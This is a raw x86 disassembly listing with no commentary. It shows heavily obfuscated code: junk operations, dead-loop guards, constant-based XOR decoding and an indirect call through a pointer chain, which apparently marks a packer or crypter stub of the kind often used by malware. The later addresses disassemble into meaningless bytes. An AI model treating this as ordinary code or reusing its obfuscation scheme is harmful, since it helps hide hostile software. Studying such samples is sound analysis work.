  40b1c3:	mov    eax,DWORD PTR [eax+0x1c8]
  40b1c9:	mov    eax,DWORD PTR [eax]
  40b1cb:	sub    DWORD PTR ds:0x425004,0x167a
  40b1d5:	cdq    
  40b1d6:	sub    ecx,DWORD PTR ds:0x427000
  40b1dc:	push   ebx
  40b1dd:	add    ebx,0x2084
  40b1e3:	mov    ecx,0xfabdbef1
  40b1e8:	add    eax,ecx
  40b1ea:	inc    ebx
  40b1eb:	adc    edx,0xffffffff
  40b1ee:	push   esi
  40b1ef:	push   edi
  40b1f0:	mov    edi,edx
  40b1f2:	mov    DWORD PTR ds:0x428004,0x5236
  40b1fc:	mov    edx,DWORD PTR [ebp+0x8]
  40b1ff:	mov    ebx,eax
  40b201:	mov    eax,0x8a29a123
  40b206:	xor    esi,esi
  40b208:	xor    ebx,eax
  40b20a:	or     DWORD PTR ds:0x426004,0x425020
  40b214:	xor    edi,0x0
  40b217:	adc    DWORD PTR ds:0x427010,0x428004
  40b221:	add    edx,ecx
  40b223:	mov    DWORD PTR ds:0x425008,0x471a
  40b22d:	adc    esi,0xffffffff
  40b230:	xor    DWORD PTR ds:0x428010,0x421e
  40b23a:	xor    edx,eax
  40b23c:	xor    DWORD PTR ds:0x425018,0x5980
  40b246:	xor    esi,0x0
  40b249:	mov    DWORD PTR ds:0x426010,0x601d
  40b253:	cmp    edx,ebx
  40b255:	mov    DWORD PTR ds:0x425008,0x5a5b
  40b25f:	jne    0x40b281
  40b265:	mov    DWORD PTR ds:0x427008,0x3ec
  40b26f:	cmp    esi,edi
  40b271:	mov    DWORD PTR ds:0x425020,0x5f4c
  40b27b:	je     0x40b345
  40b281:	and    DWORD PTR ds:0x426000,0x0
  40b28b:	mov    edx,DWORD PTR ds:0x426000
  40b291:	inc    edx
  40b292:	mov    DWORD PTR ds:0x426000,edx
  40b298:	cmp    DWORD PTR ds:0x426000,0x5
  40b29f:	jne    0x40b2c5
  40b2a5:	push   0x41ff5e
  40b2aa:	push   0x5c4e
  40b2af:	push   DWORD PTR [ebp-0xc]
  40b2b2:	push   0x6b40
  40b2b7:	push   0x149b
  40b2bc:	push   DWORD PTR [ebp-0x10]
  40b2bf:	call   DWORD PTR ds:0x42104c
  40b2c5:	cmp    DWORD PTR ds:0x426000,0x4
  40b2cc:	jne    0x40b2e1
  40b2d2:	xor    edx,edx
  40b2d4:	xor    edx,DWORD PTR ds:0x426000
  40b2da:	inc    edx
  40b2db:	mov    DWORD PTR ds:0x426000,edx
  40b2e1:	cmp    DWORD PTR ds:0x426000,0x10
  40b2e8:	jb     0x40b28b
  40b2ee:	or     DWORD PTR ds:0x42600c,0x5f7e
  40b2f8:	mov    edx,DWORD PTR ds:0x41d3dc
  40b2fe:	or     DWORD PTR ds:0x428000,0x427018
  40b308:	mov    edx,DWORD PTR [edx+0x1c0]
  40b30e:	mov    edx,DWORD PTR [edx]
  40b310:	or     DWORD PTR ds:0x425014,0x42801c
  40b31a:	xor    esi,esi
  40b31c:	adc    DWORD PTR ds:0x425010,0x7665
  40b326:	add    edx,ecx
  40b328:	adc    esi,0xffffffff
  40b32b:	xor    edx,eax
  40b32d:	xor    esi,0x0
  40b330:	cmp    edx,0x70941fd1
  40b336:	jne    0x40b3af
  40b33c:	cmp    esi,0xffffffff
  40b33f:	jne    0x40b3af
  40b345:	mov    edx,DWORD PTR ds:0x41d460
  40b34b:	mov    esi,DWORD PTR ds:0x41d458
  40b351:	xor    edx,esi
  40b353:	mov    DWORD PTR ds:0x41d458,edx
  40b359:	mov    edx,DWORD PTR [ebp+0xc]
  40b35c:	mov    edx,DWORD PTR [edx]
  40b35e:	mov    edx,DWORD PTR [edx]
  40b360:	mov    esi,DWORD PTR ds:0x41d458
  40b366:	add    DWORD PTR [edx],esi
  40b368:	mov    esi,DWORD PTR [ebp+0x8]
  40b36b:	mov    edx,DWORD PTR ds:0x41d458
  40b371:	xor    esi,0x7510893
  40b377:	add    esi,0x3272db
  40b37d:	xor    ebx,ebx
  40b37f:	add    esi,ecx
  40b381:	adc    ebx,0xffffffff
  40b384:	xor    edi,edi
  40b386:	xor    esi,eax
  40b388:	xor    ebx,0x0
  40b38b:	add    edx,ecx
  40b38d:	adc    edi,0xffffffff
  40b390:	xor    edx,eax
  40b392:	xor    edi,0x0
  40b395:	cmp    edx,esi
  40b397:	jne    0x40b3af
  40b39d:	cmp    edi,ebx
  40b39f:	jne    0x40b3af
  40b3a5:	mov    eax,ds:0x41d458
  40b3aa:	mov    ds:0x41d460,eax
  40b3af:	pop    edi
  40b3b0:	pop    esi
  40b3b1:	pop    ebx
  40b3b2:	pop    ebp
  40b3b3:	ret    0x8
  40b3b6:	push   ebp
  40b3b7:	mov    ebp,esp
  40b3b9:	sub    esp,0x90
  40b3bf:	and    DWORD PTR ds:0x428004,0x0
  40b3c9:	jmp    0x40b3db
  40b3ce:	mov    ecx,DWORD PTR ds:0x428004
  40b3d4:	inc    ecx
  40b3d5:	mov    DWORD PTR ds:0x428004,ecx
  40b3db:	cmp    DWORD PTR ds:0x428004,0x14
  40b3e2:	jae    0x40b417
  40b3e8:	cmp    DWORD PTR ds:0x428004,0x20
  40b3ef:	jne    0x40b405
  40b3f5:	push   0x41ffb1
  40b3fa:	push   0x41ff9b
  40b3ff:	call   DWORD PTR ds:0x421050
  40b405:	jmp    0x40b3ce
  40b40a:	movzx  ecx,BYTE PTR ds:0x42801c
  40b411:	sub    DWORD PTR ds:0x425014,ecx
  40b417:	push   esi
  40b418:	or     ecx,eax
  40b41a:	push   edi
  40b41b:	and    DWORD PTR ds:0x428004,0x0
  40b425:	jmp    0x40b435
  40b42a:	mov    eax,ds:0x428004
  40b42f:	inc    eax
  40b430:	mov    ds:0x428004,eax
  40b435:	cmp    DWORD PTR ds:0x428004,0x10
  40b43c:	jae    0x40b460
  40b442:	cmp    DWORD PTR ds:0x428004,0x1f
  40b449:	jne    0x40b45b
  40b44f:	push   DWORD PTR [ebp-0x20]
  40b452:	push   DWORD PTR [ebp-0x14]
  40b455:	call   DWORD PTR ds:0x421054
  40b45b:	jmp    0x40b42a
  40b460:	mov    eax,ds:0x41d3dc
  40b465:	and    ecx,0x5378
  40b46b:	mov    DWORD PTR [ebp-0x2c],eax
  40b46e:	sub    esi,DWORD PTR ds:0x425018
  40b474:	mov    eax,ds:0x41d4e8
  40b479:	mov    DWORD PTR [ebp-0x3c],eax
  40b47c:	and    DWORD PTR [ebp-0x34],0x0
  40b480:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  40b487:	add    DWORD PTR ds:0x42600c,0x3783
  40b491:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40b498:	and    DWORD PTR ds:0x42901c,0x4e39
  40b4a2:	mov    eax,DWORD PTR [ebp-0x1c]
  40b4a5:	xor    DWORD PTR ds:0x42800c,0x4866
  40b4af:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b4b2:	sub    esi,DWORD PTR ds:0x427008
  40b4b8:	xor    eax,ecx
  40b4ba:	mov    ecx,DWORD PTR ds:0x41d1fc
  40b4c0:	mov    esi,DWORD PTR ds:0x41d218
  40b4c6:	sub    ecx,esi
  40b4c8:	sub    ecx,DWORD PTR [ecx+esi*1]
  40b4cb:	mov    DWORD PTR [ebp-0x1c],eax
  40b4ce:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  40b4d5:	add    DWORD PTR ds:0x426008,ecx
  40b4db:	mov    eax,DWORD PTR [ebp-0x28]
  40b4de:	xor    DWORD PTR ds:0x428018,ebx
  40b4e4:	mov    ecx,DWORD PTR [ebp-0x28]
  40b4e7:	or     esi,edi
  40b4e9:	xor    eax,ecx
  40b4eb:	mov    DWORD PTR [ebp-0x28],eax
  40b4ee:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  40b4f5:	sub    ecx,0x68bb
  40b4fb:	mov    eax,DWORD PTR [ebp-0x18]
  40b4fe:	mov    ecx,DWORD PTR [ebp-0x18]
  40b501:	xor    eax,ecx
  40b503:	adc    ecx,esi
  40b505:	mov    DWORD PTR [ebp-0x18],eax
  40b508:	not    DWORD PTR ds:0x428008
  40b50e:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  40b515:	mov    ecx,DWORD PTR ds:0x42003f
  40b51b:	mov    esi,DWORD PTR ds:0x41d214
  40b521:	sub    esi,ecx
  40b523:	and    ecx,DWORD PTR [ecx+esi*1]
  40b526:	mov    eax,DWORD PTR [ebp-0x24]
  40b529:	mov    ecx,DWORD PTR [ebp-0x24]
  40b52c:	xor    eax,ecx
  40b52e:	and    edi,0x1f5e
  40b534:	mov    DWORD PTR [ebp-0x24],eax
  40b537:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  40b53e:	mov    eax,DWORD PTR [ebp-0x14]
  40b541:	mov    ecx,DWORD PTR [ebp-0x14]
  40b544:	xor    eax,ecx
  40b546:	and    DWORD PTR ds:0x428018,0x1b89
  40b550:	mov    DWORD PTR [ebp-0x14],eax
  40b553:	mov    edi,DWORD PTR ds:0x420027
  40b559:	mov    ecx,DWORD PTR ds:0x41d1e0
  40b55f:	sub    edi,ecx
  40b561:	xor    edi,DWORD PTR [edi+ecx*1]
  40b564:	mov    eax,DWORD PTR [ebp-0x20]
  40b567:	mov    DWORD PTR ds:0x427010,0x1f
  40b571:	cmp    DWORD PTR ds:0x427010,0x0
  40b578:	je     0x40b5ad
  40b57e:	cmp    DWORD PTR ds:0x427010,0x2f
  40b585:	jne    0x40b59b
  40b58b:	push   0x425000
  40b590:	push   0x673f
  40b595:	call   DWORD PTR ds:0x421058
  40b59b:	mov    edi,DWORD PTR ds:0x427010
  40b5a1:	dec    edi
  40b5a2:	mov    DWORD PTR ds:0x427010,edi
  40b5a8:	jmp    0x40b571
  40b5ad:	mov    ecx,DWORD PTR [ebp-0x14]
  40b5b0:	mov    esi,0x7510893
  40b5b5:	neg    DWORD PTR ds:0x42900c
  40b5bb:	xor    eax,esi
  40b5bd:	mov    edi,0x3272db
  40b5c2:	add    eax,edi
  40b5c4:	xor    eax,ecx
  40b5c6:	mov    DWORD PTR [ebp-0x14],eax
  40b5c9:	sbb    DWORD PTR ds:0x426010,0x1ce0
  40b5d3:	mov    eax,DWORD PTR [ebp-0x10]
  40b5d6:	xor    ecx,DWORD PTR ds:0x42800c
  40b5dc:	mov    ecx,DWORD PTR [ebp-0x10]
  40b5df:	sub    eax,ecx
  40b5e1:	and    ecx,DWORD PTR ds:0x427018
  40b5e7:	mov    DWORD PTR [ebp-0x10],eax
  40b5ea:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  40b5f1:	xor    ecx,DWORD PTR ds:0x42500c
  40b5f7:	mov    al,BYTE PTR [ebp-0x1]
  40b5fa:	add    DWORD PTR ds:0x425018,ecx
  40b600:	movzx  ecx,BYTE PTR [ebp-0x1]
  40b604:	movzx  eax,al
  40b607:	adc    DWORD PTR ds:0x42700c,0x429008
  40b611:	sub    ecx,eax
  40b613:	mov    BYTE PTR [ebp-0x1],cl
  40b616:	movzx  eax,BYTE PTR [ebp-0x1]
  40b61a:	xor    eax,0xffffff99
  40b61d:	mov    BYTE PTR [ebp-0x1],al
  40b620:	or     eax,DWORD PTR ds:0x42901c
  40b626:	mov    eax,DWORD PTR [ebp-0x20]
  40b629:	xor    eax,esi
  40b62b:	add    eax,edi
  40b62d:	and    DWORD PTR ds:0x429004,0xdaf
  40b637:	mov    DWORD PTR [ebp-0x14],eax
  40b63a:	and    DWORD PTR ds:0x428018,0x429014
  40b644:	lea    eax,[ebp-0x40]
  40b647:	adc    DWORD PTR ds:0x425024,0x42500c
  40b651:	mov    DWORD PTR [ebp-0x38],eax
  40b654:	adc    DWORD PTR ds:0x425020,0x75b6
  40b65e:	lea    eax,[ebp-0x38]
  40b661:	mov    DWORD PTR [ebp-0x44],eax
  40b664:	sbb    DWORD PTR ds:0x425010,0x425028
  40b66e:	lea    eax,[ebp-0x44]
  40b671:	mov    DWORD PTR [ebp-0x8],eax
  40b674:	or     DWORD PTR ds:0x427008,0x2eb5
  40b67e:	lea    eax,[ebp-0x8]
  40b681:	and    DWORD PTR ds:0x42801c,0x428004
  40b68b:	mov    DWORD PTR [ebp-0x48],eax
  40b68e:	adc    DWORD PTR ds:0x42700c,ebx
  40b694:	mov    eax,DWORD PTR [ebp-0x18]
  40b697:	sbb    DWORD PTR ds:0x425010,0x426010
  40b6a1:	xor    eax,esi
  40b6a3:	add    eax,edi
  40b6a5:	and    DWORD PTR ds:0x429014,0x19f0
  40b6af:	push   eax
  40b6b0:	mov    eax,DWORD PTR [ebp-0x1c]
  40b6b3:	xor    eax,esi
  40b6b5:	add    eax,edi
  40b6b7:	push   eax
  40b6b8:	mov    eax,DWORD PTR [ebp-0x10]
  40b6bb:	xor    eax,esi
  40b6bd:	add    eax,edi
  40b6bf:	push   eax
  40b6c0:	lea    eax,[ebp-0x90]
  40b6c6:	push   eax
  40b6c7:	push   DWORD PTR [ebp-0x20]
  40b6ca:	push   DWORD PTR [ebp-0x30]
  40b6cd:	call   0x408d97
  40b6d2:	test   eax,eax
  40b6d4:	je     0x40b705
  40b6da:	lea    eax,[ebp-0x90]
  40b6e0:	push   eax
  40b6e1:	mov    eax,DWORD PTR [ebp-0x30]
  40b6e4:	xor    eax,esi
  40b6e6:	add    eax,edi
  40b6e8:	push   eax
  40b6e9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6ec:	add    eax,0xaa
  40b6f1:	push   eax
  40b6f2:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6f5:	mov    eax,DWORD PTR [eax+0x198]
  40b6fb:	push   DWORD PTR [eax]
  40b6fd:	call   0x403f26
  40b702:	mov    DWORD PTR [ebp-0x40],eax
  40b705:	lea    eax,[ebp+0x4]
  40b708:	mov    DWORD PTR [ebp-0x34],eax
  40b70b:	mov    eax,DWORD PTR [ebp-0x8]
  40b70e:	mov    eax,DWORD PTR [eax]
  40b710:	mov    eax,DWORD PTR [eax]
  40b712:	mov    eax,DWORD PTR [eax]
  40b714:	test   eax,eax
  40b716:	je     0x40b797
  40b71c:	lea    eax,[ebp-0xc]
  40b71f:	mov    DWORD PTR [ebp-0x4c],eax
  40b722:	mov    eax,DWORD PTR [ebp-0x3c]
  40b725:	mov    DWORD PTR [ebp-0xc],eax
  40b728:	mov    eax,DWORD PTR [ebp-0x8]
  40b72b:	mov    eax,DWORD PTR [eax]
  40b72d:	mov    eax,DWORD PTR [eax]
  40b72f:	mov    eax,DWORD PTR [eax]
  40b731:	sub    DWORD PTR [ebp-0xc],eax
  40b734:	mov    ecx,DWORD PTR [ebp-0x10]
  40b737:	xor    ecx,esi
  40b739:	mov    eax,0xffcd8d25
  40b73e:	sub    eax,ecx
  40b740:	add    DWORD PTR [ebp-0xc],eax
  40b743:	mov    eax,DWORD PTR [ebp-0xc]
  40b746:	mov    ecx,DWORD PTR [ebp-0x8]
  40b749:	mov    ecx,DWORD PTR [ecx]
  40b74b:	mov    ecx,DWORD PTR [ecx]
  40b74d:	mov    ecx,DWORD PTR [ecx]
  40b74f:	mov    DWORD PTR [ecx+0x1],eax
  40b752:	mov    al,BYTE PTR [ebp-0x1]
  40b755:	mov    ecx,DWORD PTR [ebp-0x8]
  40b758:	mov    ecx,DWORD PTR [ecx]
  40b75a:	mov    ecx,DWORD PTR [ecx]
  40b75c:	mov    ecx,DWORD PTR [ecx]
  40b75e:	push   DWORD PTR [ebp-0x2c]
  40b761:	xor    al,0x6f
  40b763:	sub    al,0xd
  40b765:	mov    BYTE PTR [ecx],al
  40b767:	mov    eax,ds:0x41d258
  40b76c:	push   DWORD PTR [eax]
  40b76e:	push   DWORD PTR ds:0x41d4b4
  40b774:	push   DWORD PTR ds:0x41d260
  40b77a:	push   DWORD PTR ds:0x41d494
  40b780:	push   DWORD PTR ds:0x41d508
  40b786:	push   DWORD PTR [ebp-0x30]
  40b789:	push   DWORD PTR [ebp-0x20]
  40b78c:	mov    eax,DWORD PTR [ebp-0x8]
  40b78f:	mov    eax,DWORD PTR [eax]
  40b791:	mov    eax,DWORD PTR [eax]
  40b793:	mov    eax,DWORD PTR [eax]
  40b795:	call   eax
  40b797:	mov    eax,DWORD PTR [ebp-0x34]
  40b79a:	mov    ecx,DWORD PTR ds:0x41d458
  40b7a0:	add    DWORD PTR [eax],ecx
  40b7a2:	pop    edi
  40b7a3:	pop    esi
  40b7a4:	leave  
  40b7a5:	ret    
  40b7a6:	push   ebp
  40b7a7:	mov    ebp,esp
  40b7a9:	sub    esp,0x18
  40b7ac:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  40b7b3:	lea    eax,[ebp+0x14]
  40b7b6:	neg    edx
  40b7b8:	mov    DWORD PTR [ebp-0x4],eax
  40b7bb:	push   esi
  40b7bc:	sbb    DWORD PTR ds:0x426000,edi
  40b7c2:	mov    esi,0xf89c85b6
  40b7c7:	mov    DWORD PTR [ebp-0xc],esi
  40b7ca:	lea    eax,[ebp-0xc]
  40b7cd:	add    edx,ecx
  40b7cf:	mov    DWORD PTR [ebp-0x14],eax
  40b7d2:	sub    edx,ecx
  40b7d4:	mov    eax,DWORD PTR [ebp-0xc]
  40b7d7:	dec    ecx
  40b7d8:	mov    edx,DWORD PTR [ebp-0x14]
  40b7db:	and    ecx,0x3a88
  40b7e1:	mov    ecx,0x7510893
  40b7e6:	or     DWORD PTR ds:0x427010,0x426000
  40b7f0:	xor    eax,ecx
  40b7f2:	add    eax,0x3272db
  40b7f7:	sub    DWORD PTR ds:0x427010,0x427014
  40b801:	mov    DWORD PTR [edx],eax
  40b803:	xor    DWORD PTR ds:0x425000,0x422
  40b80d:	mov    eax,ds:0x41d254
  40b812:	mov    edx,DWORD PTR ds:0x41d1e0
  40b818:	mov    edx,DWORD PTR [edx]
  40b81a:	xor    DWORD PTR ds:0x426000,edx
  40b820:	mov    edx,DWORD PTR [ebp-0x4]
  40b823:	mov    eax,DWORD PTR [eax]
  40b825:	and    DWORD PTR ds:0x425008,0x4c84
  40b82f:	add    eax,DWORD PTR [edx]
  40b831:	mov    DWORD PTR ds:0x426004,0x10
  40b83b:	cmp    DWORD PTR ds:0x426004,0x0
  40b842:	je     0x40b874
  40b848:	cmp    DWORD PTR ds:0x426004,0x20
  40b84f:	jne    0x40b860
  40b855:	push   0x6cf7
  40b85a:	call   DWORD PTR ds:0x421014
  40b860:	xor    edx,edx
  40b862:	add    edx,DWORD PTR ds:0x426004
  40b868:	dec    edx
  40b869:	mov    DWORD PTR ds:0x426004,edx
  40b86f:	jmp    0x40b83b
  40b874:	push   edi
  40b875:	mov    DWORD PTR [ebp-0x8],eax
  40b878:	sub    edi,0x3a07
  40b87e:	mov    edi,DWORD PTR [ebp+0x8]
  40b881:	mov    DWORD PTR ds:0x429004,0x1a
  40b88b:	cmp    DWORD PTR ds:0x429004,0x0
  40b892:	je     0x40b8ca
  40b898:	cmp    DWORD PTR ds:0x429004,0x2a
  40b89f:	jne    0x40b8b8
  40b8a5:	push   0x42901c
  40b8aa:	push   0x429000
  40b8af:	push   DWORD PTR [ebp-0xc]
  40b8b2:	call   DWORD PTR ds:0x42105c
  40b8b8:	mov    edx,DWORD PTR ds:0x429004
  40b8be:	dec    edx
  40b8bf:	mov    DWORD PTR ds:0x429004,edx
  40b8c5:	jmp    0x40b88b
  40b8ca:	mov    eax,ds:0x41d3dc
  40b8cf:	add    DWORD PTR ds:0x426018,0x7a9e
  40b8d9:	mov    eax,DWORD PTR [eax+0x198]
  40b8df:	and    DWORD PTR ds:0x428000,0x0
  40b8e9:	jmp    0x40b8fb
  40b8ee:	mov    edx,DWORD PTR ds:0x428000
  40b8f4:	inc    edx
  40b8f5:	mov    DWORD PTR ds:0x428000,edx
  40b8fb:	cmp    DWORD PTR ds:0x428000,0x16
  40b902:	jae    0x40b949
  40b908:	cmp    DWORD PTR ds:0x428000,0xa
  40b90f:	jne    0x40b920
  40b915:	push   0x6e10
  40b91a:	call   DWORD PTR ds:0x421018
  40b920:	cmp    DWORD PTR ds:0x428000,0x9
  40b927:	jne    0x40b93a
  40b92d:	mov    edx,DWORD PTR ds:0x428000
  40b933:	inc    edx
  40b934:	mov    DWORD PTR ds:0x428000,edx
  40b93a:	jmp    0x40b8ee
  40b93f:	adc    DWORD PTR ds:0x42800c,0x7489
  40b949:	xor    edi,ecx
  40b94b:	mov    edx,DWORD PTR ds:0x41d22c
  40b951:	mov    edx,DWORD PTR [edx]
  40b953:	and    DWORD PTR ds:0x426010,edx
  40b959:	mov    edx,0x3272db
  40b95e:	add    edi,edx
  40b960:	mov    DWORD PTR ds:0x427014,0x73af
  40b96a:	cmp    DWORD PTR [eax],edi
  40b96c:	je     0x40b98d
  40b972:	mov    DWORD PTR ds:0x427018,0x6eb3
  40b97c:	mov    eax,DWORD PTR [eax]
  40b97e:	mov    DWORD PTR ds:0x429008,0x1439
  40b988:	jmp    0x410469
  40b98d:	mov    eax,0x67c2
  40b992:	mov    eax,DWORD PTR [ebp+0x18]
  40b995:	cmp    eax,esi
  40b997:	jne    0x40b9b1
  40b99d:	mov    DWORD PTR ds:0x427004,0x29bc
  40b9a7:	push   0xf89c85b5
  40b9ac:	jmp    0x410458
  40b9b1:	mov    esi,DWORD PTR [ebp+0x18]
  40b9b4:	not    DWORD PTR ds:0x42700c
  40b9ba:	mov    eax,0xf89c85b4
  40b9bf:	mov    DWORD PTR ds:0x427008,0x585a
  40b9c9:	cmp    esi,eax
  40b9cb:	mov    DWORD PTR ds:0x429004,0x6551
  40b9d5:	jne    0x410448
  40b9db:	or     eax,eax
  40b9dd:	mov    eax,DWORD PTR [ebp+0x10]
  40b9e0:	add    DWORD PTR ds:0x425020,edi
  40b9e6:	xor    eax,ecx
  40b9e8:	add    DWORD PTR ds:0x425020,0xdeb
  40b9f2:	add    eax,edx
  40b9f4:	mov    DWORD PTR ds:0x425004,0x1b
  40b9fe:	cmp    DWORD PTR ds:0x425004,0x0
  40ba05:	je     0x40ba5e
  40ba0b:	cmp    DWORD PTR ds:0x425004,0x2
  40ba12:	jne    0x40ba30
  40ba18:	push   0x7389
  40ba1d:	push   0x7d80
  40ba22:	push   DWORD PTR [ebp-0xc]
  40ba25:	push   0x7694
  40ba2a:	call   DWORD PTR ds:0x42101c
  40ba30:	cmp    DWORD PTR ds:0x425004,0x3
  40ba37:	jne    0x40ba4a
  40ba3d:	mov    esi,DWORD PTR ds:0x425004
  40ba43:	dec    esi
  40ba44:	mov    DWORD PTR ds:0x425004,esi
  40ba4a:	xor    esi,esi
  40ba4c:	add    esi,DWORD PTR ds:0x425004
  40ba52:	dec    esi
  40ba53:	mov    DWORD PTR ds:0x425004,esi
  40ba59:	jmp    0x40b9fe
  40ba5e:	mov    DWORD PTR [ebp-0x18],eax
  40ba61:	adc    eax,DWORD PTR ds:0x42801c
  40ba67:	mov    eax,DWORD PTR [ebp+0xc]
  40ba6a:	mov    esi,DWORD PTR [ebp-0x8]
  40ba6d:	or     DWORD PTR ds:0x42501c,0x426004
  40ba77:	xor    eax,ecx
  40ba79:	add    eax,edx
  40ba7b:	xor    DWORD PTR ds:0x429004,0x42601c
  40ba85:	imul   eax,DWORD PTR [esi]
  40ba88:	mov    esi,DWORD PTR [ebp+0x8]
  40ba8b:	sbb    DWORD PTR ds:0x427014,0x428018
  40ba95:	xor    esi,ecx
  40ba97:	add    DWORD PTR ds:0x429014,0x42500c
  40baa1:	add    esi,edx
  40baa3:	cmp    esi,eax
  40baa5:	jmp    0x40de50
  40baaa:	jl     0x40baa1
  40baac:	retf   0xc78f
  40baaf:	mov    esi,DWORD PTR [ebx]
  40bab1:	test   edi,edi
  40bab3:	rcl    ch,cl
  40bab5:	jmp    0xf573:0xd7440558
  40babc:	bound  esp,QWORD PTR [edx-0xc]
  40babf:	pop    edi
  40bac0:	bound  esp,QWORD PTR [edx+0x10]
  40bac3:	dec    ebp
  40bac4:	xor    DWORD PTR [bp-0x42],0x9392a9d3
  40bacc:	jle    0x40ba92
  40bace:	push   0x9d3569a5
  40bad3:	popa   
  40bad4:	pop    ss
  40bad5:	mov    eax,ds:0xe7518198
  40bada:	mov    esp,0x7126041a
  40badf:	inc    eax
  40bae0:	(bad)  
  40bae2:	loope  0x40bb40
  40bae4:	xchg   BYTE PTR [esi+0x1b],ah
  40bae7:	push   cs
  40bae8:	xchg   esp,eax
  40bae9:	sub    bh,BYTE PTR [edi]
  40baeb:	(bad)  
  40baec:	cmc    
  40baed:	retf   
  40baee:	lock xchg ebp,eax
  40baf0:	cmp    al,0x5c
  40baf2:	xor    eax,0x318729e7
  40baf7:	lock add ch,BYTE PTR [eax]
  40bafa:	test   al,0x9e
  40bafc:	fwait
  40bafd:	ret    
  40bafe:	repnz mov esi,0x22c9aa1f
  40bb04:	sbb    BYTE PTR [ecx+ecx*1-0x1a3d9140],bh
  40bb0b:	xor    al,0xf6
  40bb0d:	imul   eax,DWORD PTR [eax+0xe5ad222],0xffffff88
  40bb14:	mov    ecx,0xabeae848
  40bb19:	or     esi,DWORD PTR [eax-0x63]
  40bb1c:	xchg   esi,eax
  40bb1d:	out    dx,al
  40bb1e:	fistp  WORD PTR [edi+0x16]
  40bb21:	add    al,0xac
  40bb23:	pop    edi
  40bb24:	or     DWORD PTR [esi+0x35c036e1],edi
  40bb2a:	leave  
  40bb2b:	or     eax,0xcd716b51
  40bb30:	xlat   BYTE PTR ds:[ebx]
  40bb31:	test   eax,0x3ae67cdd
  40bb36:	ss push esi
  40bb38:	stos   DWORD PTR es:[edi],eax
  40bb39:	out    0xe9,eax
  40bb3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb3c:	jge    0x40bac1
  40bb3e:	mov    ebp,0x8dae43d
  40bb43:	out    0x78,al
  40bb45:	hlt    
  40bb46:	addr16 push edi
  40bb48:	push   esp
  40bb49:	or     BYTE PTR [ebp+eax*8+0x3a203a0f],cl
  40bb50:	cld    
  40bb51:	fimul  DWORD PTR [edx]
  40bb53:	imul   DWORD PTR [edi]
  40bb55:	test   al,0xbe
  40bb57:	cld    
  40bb58:	ret    0x97f
  40bb5b:	dec    ebp
  40bb5c:	rol    DWORD PTR [esp+ebp*1-0x7f],0x22
  40bb61:	mov    dh,0xc7
  40bb63:	xchg   esp,eax
  40bb64:	xchg   esi,eax
  40bb65:	jmp    0x99b4d196
  40bb6a:	mov    cl,0xc8
  40bb6c:	nop
  40bb6d:	(bad)  
  40bb6e:	sti    
  40bb6f:	add    eax,0x904f3bfb
  40bb74:	clc    
  40bb75:	adc    BYTE PTR [eax-0x41ada8bf],dl
  40bb7b:	xchg   edx,eax
  40bb7c:	mov    ebp,0xe1c5c994
  40bb81:	iret   
  40bb82:	je     0x40bb74
  40bb84:	sbb    al,BYTE PTR [eax]
  40bb86:	inc    edx
  40bb87:	mov    dh,0x4c
  40bb89:	pop    eax
  40bb8a:	inc    eax
  40bb8b:	ins    DWORD PTR es:[edi],dx
  40bb8c:	int3   
  40bb8d:	mov    dh,0x70
  40bb8f:	test   DWORD PTR [ebp+0x34],0x2abe96fd
  40bb96:	ror    esi,1
  40bb98:	cs xchg ebx,eax
  40bb9a:	adc    BYTE PTR [ebx-0x5269aaaf],ah
  40bba0:	(bad)  
  40bba1:	arpl   sp,ax
  40bba3:	dec    esp
  40bba4:	mov    BYTE PTR [edx],cl
  40bba6:	xor    BYTE PTR [eax+eiz*2-0xa],bl
  40bbaa:	cdq    
  40bbab:	addr16 mul bh
  40bbae:	sbb    al,0xa
  40bbb0:	inc    esp
  40bbb1:	pop    es
  40bbb2:	(bad)  
  40bbb3:	mov    bh,dh
  40bbb5:	in     al,dx
  40bbb6:	adc    al,0x2d
  40bbb8:	in     eax,0x6c
  40bbba:	xor    ch,BYTE PTR [edi+0x29]
  40bbbd:	xor    eax,0x9df95d14
  40bbc2:	popa   
  40bbc3:	hlt    
  40bbc4:	dec    edx
  40bbc5:	push   0x2a
  40bbc7:	jge    0x40bbbf
  40bbc9:	out    0xf,eax
  40bbcb:	mov    al,ds:0x3fcd41d3
  40bbd0:	cmp    eax,0x93daf84b
  40bbd5:	push   0x20
  40bbd7:	add    ah,bl
  40bbd9:	out    0xd9,al
  40bbdb:	xchg   DWORD PTR [esi+0x7d],eax
  40bbde:	jge    0x40bc48
  40bbe0:	mov    dl,0x36
  40bbe2:	call   0x132b:0xdf9a06d0
  40bbe9:	push   ebp
  40bbea:	cmp    eax,0xcb7bcbca
  40bbef:	mov    BYTE PTR [ecx-0xd],bh
  40bbf2:	jns    0x40bc59
  40bbf4:	test   eax,0x9fd4ad25
  40bbf9:	enter  0x68fb,0xf8
  40bbfd:	mov    bh,0xbb
  40bbff:	inc    ebp
  40bc00:	and    ch,BYTE PTR [esp+eiz*8+0x0]
  40bc04:	sub    esi,DWORD PTR [edi]
  40bc06:	push   eax
  40bc07:	mov    es,WORD PTR [ecx+0x7c069320]
  40bc0d:	mov    bl,0x82
  40bc0f:	es and bl,0xbe
  40bc13:	push   0xd39aad26
  40bc18:	or     esi,esi
  40bc1a:	retf   0xfd0
  40bc1d:	inc    edi
  40bc1e:	jnp    0x40bc4e
  40bc20:	daa    
  40bc21:	loop   0x40bc36
  40bc23:	adc    DWORD PTR [edx],edx
  40bc25:	lods   eax,DWORD PTR ds:[esi]
  40bc26:	adc    edx,ecx
  40bc28:	cld    
  40bc29:	adc    eax,0x5fb4bec8
  40bc2e:	ins    DWORD PTR es:[edi],dx
  40bc2f:	into   
  40bc30:	mov    dl,0x52
  40bc32:	lods   eax,DWORD PTR ds:[esi]
  40bc33:	into   
  40bc34:	sbb    esi,DWORD PTR [edx+0x223fe110]
  40bc3a:	push   ebp
  40bc3b:	sbb    BYTE PTR [edx+ecx*1],bh
  40bc3e:	pop    es
  40bc3f:	pop    es
